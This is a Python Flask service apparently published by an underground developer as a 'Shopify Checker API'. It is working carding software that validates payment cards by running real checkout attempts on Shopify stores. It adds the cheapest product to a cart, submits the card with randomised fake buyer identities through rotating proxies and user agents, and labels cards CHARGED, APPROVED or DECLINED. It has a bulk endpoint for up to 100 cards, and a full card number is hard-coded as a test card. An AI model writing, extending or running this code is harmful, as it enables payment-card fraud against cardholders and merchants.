# Shopify api source code
# Telegram: https://t.me/afuonax
# Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
import os
import re
import json
import time
import random
import asyncio
import logging
from datetime import datetime
from typing import Optional
from urllib.parse import urlparse, quote

from flask import Flask, jsonify, request
import httpx
from fake_useragent import UserAgent

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

PORT = int(os.environ.get('PORT', 8000))


def parse_proxy_ultimate(proxy_str: str) -> Optional[str]:
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if m:
        proxy_type = m.group(1).lower()
        proxy_str = m.group(2)
    host = port = username = password = ''
    m = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if m:
        username, password, host, port = m.groups()
    else:
        m = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
        if m:
            host, port, username, password = m.groups()
        else:
            m = re.match(r'^([^:@]+):(\d+)$', proxy_str)
            if m:
                host, port = m.groups()
            else:
                return None
    if not host or not port:
        return None
    if username and password:
        u = quote(username, safe='')
        p = quote(password, safe='')
        if proxy_type in ('socks5', 'socks4'):
            return f'{proxy_type}://{u}:{p}@{host}:{port}'
        return f'http://{u}:{p}@{host}:{port}'
    if proxy_type in ('socks5', 'socks4'):
        return f'{proxy_type}://{host}:{port}'
    return f'http://{host}:{port}'


async def with_retry(func, max_retries=2, *args, **kwargs):
    for attempt in range(max_retries):
        try:
            result = await func(*args, **kwargs)
            if result.get('status') not in ('error', 'unknown'):
                return result
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
        except Exception as e:
            logger.error(f"Attempt {attempt+1} failed: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(2 ** attempt)
    return {"status": "error", "message": "All retries failed", "price": None}


class ShopifyChecker:
    def __init__(self, proxy=None):
        self.ua = UserAgent()
        self.proxy = proxy

    async def get_random_info(self):
        addresses = [
            {"add1": "123 Main St", "city": "Portland", "state": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave", "city": "Portland", "state": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd", "city": "Bangor", "state": "ME", "zip": "04401"},
            {"add1": "321 Elm St", "city": "Portland", "state": "ME", "zip": "04103"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state": "ME", "zip": "04240"},
        ]
        addr = random.choice(addresses)
        first = random.choice(["John", "Emily", "Michael", "Jessica", "David", "Sarah", "James", "Lisa"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"])
        email = f"{first.lower()}.{last.lower()}{random.randint(1,999)}@gmail.com"
        phone = random.choice(["2025550199", "3105551234", "4155559876", "6175550123", "9718081573", "2125559999"])
        return {"first": first, "last": last, "email": email, "phone": phone,
                "address": addr["add1"], "city": addr["city"],
                "state": addr["state"], "zip": addr["zip"]}

    async def get_cheapest_product(self, session, site):
        all_variants = []
        for base_url in [f"{site}/products.json", f"{site}/collections/all/products.json"]:
            page = 1
            while page <= 10:
                try:
                    r = await session.get(f"{base_url}?page={page}&limit=250")
                    if r.status_code != 200:
                        break
                    products = r.json().get('products', [])
                    if not products:
                        break
                    for product in products:
                        for v in product.get('variants', []):
                            if v.get('available', False):
                                try:
                                    price = float(v.get('price', 100))
                                    all_variants.append({
                                        'id': str(v['id']),
                                        'title': product.get('title', 'Product'),
                                        'price': str(int(price * 100)),
                                        'price_value': price
                                    })
                                except Exception:
                                    pass
                    if len(products) < 250:
                        break
                    page += 1
                except Exception:
                    page += 1
                    continue
        if all_variants:
            all_variants.sort(key=lambda x: x['price_value'])
            cheapest = all_variants[0]
            cheapest.pop('price_value', None)
            return cheapest
        return {'id': '39555780771934', 'title': 'Default Product', 'price': '100'}

    async def extract_checkout_tokens(self, html):
        tokens = {'session_token': '', 'queue_token': '', 'stable_id': '', 'payment_id': '', 'updated_total': ''}
        for pat in [r'session-token" content="([^"]+)"', r'"sessionToken":"([^"]+)"', r"'sessionToken':'([^']+)'", r'data-session-token="([^"]+)"']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                tokens['session_token'] = m.group(1)
                break
        for pat in [r'"queueToken":"([^"]+)"', r"'queueToken':'([^']+)'", r'queueToken["\']?\s*:\s*["\']([^"\']+)["\']']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                tokens['queue_token'] = m.group(1)
                break
        for pat in [r'stableId["\']?\s*:\s*["\']([^"\']+)["\']', r'"stableId":"([^"]+)"']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                tokens['stable_id'] = m.group(1)
                break
        for pat in [r'paymentMethodIdentifier["\']?\s*:\s*["\']([^"\']+)["\']', r'"paymentMethodIdentifier":"([^"]+)"']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                tokens['payment_id'] = m.group(1)
                break
        for pat in [r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*"(\d+)"', r'"totalPrice"\s*:\s*"(\d+)"', r'total_price["\s:]+(\d+)']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                tokens['updated_total'] = m.group(1)
                break
        return tokens

    async def process_card(self, site, card):
        start_time = time.time()
        try:
            parts = card.split('|')
            if len(parts) != 4:
                return {"status": "error", "message": "Invalid card format. Use: NUMBER|MM|YY|CVV", "price": None}
            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[2:]
            now = datetime.now()
            exp_year = int(year) + (2000 if int(year) < 100 else 0)
            exp_month = int(month)
            if exp_year < now.year or (exp_year == now.year and exp_month < now.month):
                return {"status": "declined", "message": f"Card DECLINED - Expired ({month}/{year})", "price": None}

            client_kwargs = {
                'timeout': 45.0,
                'follow_redirects': True,
                'verify': True,
                'headers': {'User-Agent': self.ua.random}
            }
            if self.proxy:
                parsed = parse_proxy_ultimate(self.proxy)
                if parsed:
                    client_kwargs['proxy'] = parsed

            async with httpx.AsyncClient(**client_kwargs) as session:
                product = await self.get_cheapest_product(session, site)
                price = product['price']

                r = await session.post(f"{site}/cart/add.js",
                                       data={'id': product['id'], 'quantity': 1},
                                       headers={'Content-Type': 'application/x-www-form-urlencoded'})
                if r.status_code not in (200, 201, 302):
                    return {"status": "error", "message": f"Failed to add to cart: {r.status_code}", "price": price}

                r = await session.get(f"{site}/cart.js")
                if r.status_code != 200:
                    return {"status": "error", "message": "Failed to get cart", "price": price}
                cart_token = r.json().get('token')

                r = await session.get(f"{site}/checkout")
                if r.status_code != 200:
                    return {"status": "error", "message": "Failed to access checkout", "price": price}

                tokens = await self.extract_checkout_tokens(r.text)
                if not tokens.get('session_token'):
                    return {"status": "error", "message": "Could not extract session token", "price": price}

                user = await self.get_random_info()

                payment_data = {
                    'credit_card': {
                        'number': cc_num, 'month': month, 'year': year,
                        'verification_value': cvv,
                        'name': f"{user['first']} {user['last']}"
                    },
                    'payment_session_scope': urlparse(site).netloc
                }
                r = await session.post('https://deposit.us.shopifycs.com/sessions',
                                       json=payment_data,
                                       headers={'Content-Type': 'application/json'})
                if r.status_code != 200:
                    return {"status": "declined", "message": "Card DECLINED - Payment session failed", "price": price}
                session_id = r.json().get('id')
                if not session_id:
                    return {"status": "declined", "message": "Card DECLINED", "price": price}

                final_price = tokens.get('updated_total') or price
                graphql_url = f"{site}/checkouts/unstable/graphql"
                graphql_payload = {
                    'operationName': 'SubmitForCompletion',
                    'query': 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) { submitForCompletion(input: $input, attemptToken: $attemptToken) { __typename ... on SubmitSuccess { receipt { id token } } ... on SubmitFailed { reason } ... on Throttled { pollAfter queueToken } } }',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': tokens['session_token']},
                            'queueToken': tokens.get('queue_token'),
                            'delivery': {'deliveryLines': [{
                                'targetMerchandiseLines': {'lines': [{'stableId': tokens.get('stable_id')}]},
                                'destination': {'streetAddress': {
                                    'address1': user['address'], 'city': user['city'],
                                    'countryCode': 'US', 'postalCode': user['zip'],
                                    'firstName': user['first'], 'lastName': user['last'],
                                    'phone': user['phone']}}
                            }]},
                            'payment': {'paymentLines': [{
                                'paymentMethod': {'directPaymentMethod': {
                                    'paymentMethodIdentifier': tokens.get('payment_id'),
                                    'sessionId': session_id,
                                    'billingAddress': {'streetAddress': {
                                        'address1': user['address'], 'city': user['city'],
                                        'countryCode': 'US', 'postalCode': user['zip'],
                                        'firstName': user['first'], 'lastName': user['last'],
                                        'phone': user['phone']}}}}
                            }]},
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {'emailOrSms': {'value': user['email']}}
                            }
                        },
                        'attemptToken': f"{cart_token}-{random.random()}"
                    }
                }
                headers = {'User-Agent': self.ua.random,
                           'X-Checkout-One-Session-Token': tokens['session_token'],
                           'Content-Type': 'application/json'}
                r = await session.post(graphql_url, json=graphql_payload, headers=headers)
                if r.status_code != 200:
                    return {"status": "error", "message": "GraphQL request failed", "price": final_price}
                result = r.json()

                if 'data' in result and result['data'].get('submitForCompletion'):
                    completion = result['data']['submitForCompletion']
                    if completion.get('__typename') == 'SubmitSuccess':
                        receipt = completion.get('receipt', {})
                        receipt_id = receipt.get('id')
                        if receipt_id:
                            poll_payload = {
                                'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ... on ProcessedReceipt{id token orderIdentity{id}} ... on ProcessingReceipt{id pollDelay} ... on ActionRequiredReceipt{id} ... on FailedReceipt{id processingError{code messageUntranslated}}}}',
                                'variables': {'receiptId': receipt_id, 'sessionToken': tokens['session_token']}
                            }
                            for _ in range(7):
                                await asyncio.sleep(2.5)
                                pr = await session.post(graphql_url, json=poll_payload, headers=headers)
                                if pr.status_code != 200:
                                    continue
                                pd = pr.json()
                                rd = pd.get('data', {}).get('receipt') if 'data' in pd else None
                                if not rd:
                                    continue
                                tn = rd.get('__typename')
                                if tn == 'ProcessedReceipt':
                                    oid = rd.get('orderIdentity', {}).get('id', 'N/A')
                                    return {"status": "charged", "message": f"CHARGED! Order: {oid}", "price": final_price}
                                if tn == 'FailedReceipt':
                                    code = rd.get('processingError', {}).get('code', 'Unknown')
                                    if code == 'INSUFFICIENT_FUNDS':
                                        return {"status": "approved", "message": "APPROVED - Insufficient Funds", "price": final_price}
                                    if code == 'INCORRECT_CVC':
                                        return {"status": "approved", "message": "APPROVED - Invalid CVV", "price": final_price}
                                    return {"status": "declined", "message": f"DECLINED - {code}", "price": final_price}
                                if tn == 'ActionRequiredReceipt':
                                    return {"status": "approved", "message": "APPROVED - 3DS Required", "price": final_price}
                            return {"status": "approved", "message": "APPROVED - Processing", "price": final_price}
                        order_id = receipt.get('token', 'N/A')
                        return {"status": "charged", "message": f"CHARGED! Order: {order_id}", "price": final_price}
                    if completion.get('__typename') == 'Throttled':
                        return {"status": "approved", "message": "APPROVED - Processing", "price": final_price}
                    if completion.get('__typename') == 'SubmitFailed':
                        reason = completion.get('reason', 'Unknown')
                        if 'declined' in reason.lower():
                            return {"status": "declined", "message": "DECLINED", "price": final_price}
                        return {"status": "declined", "message": f"DECLINED - {reason}", "price": final_price}

                r = await session.get(f"{site}/checkout?from_processing_page=1&validate=true", follow_redirects=True)
                txt = r.text.lower()
                if "captcha" in txt or "challenge" in str(r.url):
                    return {"status": "error", "message": "CAPTCHA required - Site protected", "price": final_price}
                if "thank you" in txt or "order confirmed" in txt:
                    return {"status": "charged", "message": "CHARGED! Order confirmed", "price": final_price}
                if "insufficient funds" in txt:
                    return {"status": "approved", "message": "APPROVED - Insufficient funds", "price": final_price}
                if "card was declined" in txt:
                    return {"status": "declined", "message": "DECLINED", "price": final_price}
                return {"status": "unknown", "message": "UNKNOWN RESPONSE", "price": final_price}
        except Exception as e:
            logger.error(f"Process error: {e}")
            return {"status": "error", "message": f"Error: {str(e)[:100]}", "price": None}


app = Flask(__name__)


@app.route('/')
def home():
    return jsonify({
        "service": "Shopify Checker API",
        "version": "2.0",
        "status": "online",
        "endpoints": ["/health", "/check", "/mass", "/test_site", "/test_proxy", "/stats"]
    })


@app.route('/health')
def health():
    return jsonify({"status": "healthy", "type": "shopify", "version": "2.0"})


@app.route('/check')
def check_card():
    try:
        site = request.args.get('site')
        cc = request.args.get('cc')
        proxy_str = request.args.get('proxy')

        if not site:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
            return jsonify({"error": "Invalid card format. Use: NUMBER|MM|YY|CVV"}), 400

        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        site_url = f'https://{site}'

        proxy = None
        if proxy_str:
            proxy = parse_proxy_ultimate(proxy_str)
            if not proxy:
                return jsonify({"error": "Invalid proxy format"}), 400

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        checker = ShopifyChecker(proxy=proxy)

        async def run_check():
            return await with_retry(checker.process_card, 2, site_url, cc)

        result = loop.run_until_complete(run_check())
        loop.close()

        status_map = {'charged': 'CHARGED', 'approved': 'APPROVED',
                      'declined': 'DECLINED', 'error': 'ERROR', 'unknown': 'UNKNOWN'}

        return jsonify({
            "success": result['status'] in ('charged', 'approved'),
            "card": cc,
            "status": status_map.get(result['status'], 'UNKNOWN'),
            "message": result['message'],
            "price": result.get('price', 'N/A'),
            "site": site
        })
    except Exception as e:
        logger.error(f"Check error: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/mass')
def mass_check():
    try:
        site = request.args.get('site')
        proxy_str = request.args.get('proxy')
        cards_param = request.args.get('cards')

        if not site:
            return jsonify({"error": "Missing 'site' parameter"}), 400
        if not cards_param:
            return jsonify({"error": "Missing 'cards' parameter"}), 400

        proxy = None
        if proxy_str:
            proxy = parse_proxy_ultimate(proxy_str)
            if not proxy:
                return jsonify({"error": "Invalid proxy format"}), 400

        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        site_url = f'https://{site}'
        cards = cards_param.split(',')[:100]

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def process_with_workers():
            sem = asyncio.Semaphore(4)

            async def process_one(card):
                async with sem:
                    checker = ShopifyChecker(proxy=proxy)
                    result = await with_retry(checker.process_card, 2, site_url, card.strip())
                    return {"card": card.strip(),
                            "status": result['status'].upper(),
                            "message": result['message'][:100],
                            "price": result.get('price', 'N/A')}

            return await asyncio.gather(*[process_one(c) for c in cards])

        results = loop.run_until_complete(process_with_workers())
        loop.close()

        charged = len([r for r in results if r['status'] == 'CHARGED'])
        approved = len([r for r in results if r['status'] == 'APPROVED'])
        declined = len([r for r in results if r['status'] == 'DECLINED'])
        errors = len([r for r in results if r['status'] == 'ERROR'])
        return jsonify({"site": site, "total": len(results), "charged": charged,
                        "approved": approved, "declined": declined,
                        "errors": errors, "results": results})
    except Exception as e:
        logger.error(f"Mass check error: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/test_site')
def test_site_endpoint():
    try:
        site = request.args.get('site')
        proxy_str = request.args.get('proxy')

        if not site:
            return jsonify({"error": "Missing 'site' parameter"}), 400

        proxy = None
        if proxy_str:
            proxy = parse_proxy_ultimate(proxy_str)
            if not proxy:
                return jsonify({"error": "Invalid proxy format"}), 400

        site = site.replace('https://', '').replace('http://', '').split('/')[0]
        site_url = f'https://{site}'
        test_card = "4031630422575208|01|2030|280"

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        checker = ShopifyChecker(proxy=proxy)

        async def run_test():
            return await with_retry(checker.process_card, 2, site_url, test_card)

        result = loop.run_until_complete(run_test())
        loop.close()

        s = result['status']
        msg = result['message']
        if s == 'charged':
            return jsonify({"domain": site, "working": True, "status": "CHARGED", "response": msg})
        if s == 'approved':
            return jsonify({"domain": site, "working": True, "status": "APPROVED", "response": msg})
        if "insufficient" in msg.lower():
            return jsonify({"domain": site, "working": True, "status": "NO BALANCE", "response": msg})
        if "3d" in msg.lower() or "secure" in msg.lower():
            return jsonify({"domain": site, "working": True, "status": "3D", "response": msg})
        if "declined" in msg.lower():
            return jsonify({"domain": site, "working": True, "status": "DECLINED", "response": msg})
        return jsonify({"domain": site, "working": False, "status": "DEAD", "response": msg})
    except Exception as e:
        logger.error(f"Test site error: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/test_proxy')
def test_proxy_endpoint():
    try:
        proxy_str = request.args.get('proxy')
        if not proxy_str:
            return jsonify({"error": "Missing 'proxy' parameter"}), 400

        proxy = parse_proxy_ultimate(proxy_str)
        if not proxy:
            return jsonify({"error": "Invalid proxy format"}), 400

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def test():
            async with httpx.AsyncClient(proxy=proxy, timeout=15, verify=True) as client:
                r = await client.get('https://api.ipify.org?format=json')
                return r.json().get('ip')

        ip = loop.run_until_complete(test())
        loop.close()
        return jsonify({"success": True, "ip": ip, "proxy": proxy_str})
    except Exception as e:
        logger.error(f"Proxy test failed: {e}")
        return jsonify({"success": False, "error": str(e)}), 400


@app.route('/stats')
def stats():
    return jsonify({
        "api_version": "2.0",
        "features": ["proxy_all_formats", "concurrent_mass_check", "auto_retry",
                     "full_card_display", "site_testing", "proxy_testing",
                     "polling_7_attempts", "pagination", "phone_number"],
        "message": "API is ready to use"
    })


@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found. See / for available endpoints"}), 404


@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal server error"}), 500


if __name__ == '__main__':
    print("=" * 60)
    print(" SHOPIFY CHECKER API - V2")
    print("=" * 60)
    print(f" Port: {PORT}")
    print(" API Key: DISABLED")
    print("=" * 60)
    app.run(host='0.0.0.0', port=PORT, debug=False)
